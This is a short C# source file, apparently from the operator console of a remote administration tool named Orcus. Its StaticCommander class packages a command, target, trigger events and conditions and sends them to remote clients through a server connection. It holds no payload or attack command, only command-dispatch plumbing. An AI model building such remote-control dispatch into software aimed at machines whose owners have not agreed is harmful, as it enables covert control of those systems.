using System.Collections.Generic;
using Orcus.Shared.DynamicCommands;
using Orcus.Plugins.StaticCommands;

namespace Orcus.Administration.App
{
	public class StaticCommander
	{
		private readonly ConnectionManager _serverConnection;

		public StaticCommander(ConnectionManager serverConnection)
		{
			_serverConnection = serverConnection;
		}

		public void ExecuteCommand(StaticCommand staticCommand, TransmissionEvent transmissionEvent, ExecutionEvent executionEvent,
			List<Condition> conditions, CommandTarget target)
		{
			if (conditions != null && conditions.Count == 0)
				conditions = null;

			_serverConnection.SendCommand(new DynamicCommand
				{
					CommandId = staticCommand.CommandId,
					Target = target,
					Conditions = conditions,
					TransmissionEvent = transmissionEvent,
					ExecutionEvent = executionEvent,
					CommandParameter = staticCommand.GetCommandParameter().Data,
					PluginHash = null
				});
		}
	}
}